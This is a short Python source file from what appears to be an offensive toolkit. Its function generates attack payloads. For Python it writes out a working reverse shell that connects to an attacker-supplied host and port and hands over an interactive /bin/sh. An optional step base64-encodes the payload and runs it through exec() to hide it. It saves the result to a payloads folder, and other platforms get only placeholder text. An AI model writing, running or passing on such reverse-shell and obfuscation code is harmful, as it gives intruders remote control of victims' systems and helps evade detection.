import os
import base64

def generate_payload(platform, lhost, lport, payload_type="reverse_tcp", obfuscate=False):
    print(f"[*] Generating payload for {platform} with LHOST={lhost} and LPORT={lport}...")

    if platform == "python":
        payload = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""
    else:
        # In a real scenario, we would have different payload templates for each platform
        payload = f"echo 'This is a placeholder for a {platform} payload'"

    if obfuscate:
        payload = base64.b64encode(payload.encode()).decode()
        payload = f"import base64; exec(base64.b64decode('{payload}'))"

    payload_name = f"payload.{'exe' if platform == 'windows' else 'py'}"
    payload_path = os.path.join("crystal", "payloads", payload_name)
    with open(payload_path, "w") as f:
        f.write(payload)
    print(f"[+] Payload generated at {payload_path}")
    return payload_path
